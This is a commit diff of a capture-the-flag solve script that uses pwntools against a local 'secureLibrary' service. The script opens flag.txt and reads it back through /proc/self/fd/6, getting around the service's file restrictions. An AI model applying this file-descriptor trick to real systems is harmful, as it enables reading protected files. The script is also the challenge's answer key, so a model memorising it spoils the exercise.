a5cee61d89e3f1167b52999426670659055da3c8
Hamza El Makhroubi <hamzaelmakhroubi@Hamzas-Laptop.local>
2024-10-21 21:07:28 +0100

    added misc writeups

--- Misc/secureLibrary/solution/solve.py
+++ Misc/secureLibrary/solution/solve.py
@@ -1,20 +1,25 @@
-import pwn
+from pwn import *
 
 HOST = 'localhost'
-PORT = 4746
+PORT = 4041
 
-conn = pwn.remote(HOST, PORT)
+conn = remote(HOST, PORT)
 
 print(conn.recvuntil(b'Enter choice:').decode())
 conn.sendline(b'2')
+
 print(conn.recvuntil(b'Enter file name:').decode())
 conn.sendline(b'flag.txt')
+
 print(conn.recvuntil(b'Enter choice:').decode())
 conn.sendline(b'2')
+
 print(conn.recvuntil(b'Enter file name:').decode())
 conn.sendline(b'/proc/self/fd/6')
+
 print(conn.recvuntil(b'Enter choice:').decode())
 conn.sendline(b'3')
+
 print(conn.recvall().decode())
 
 conn.close()
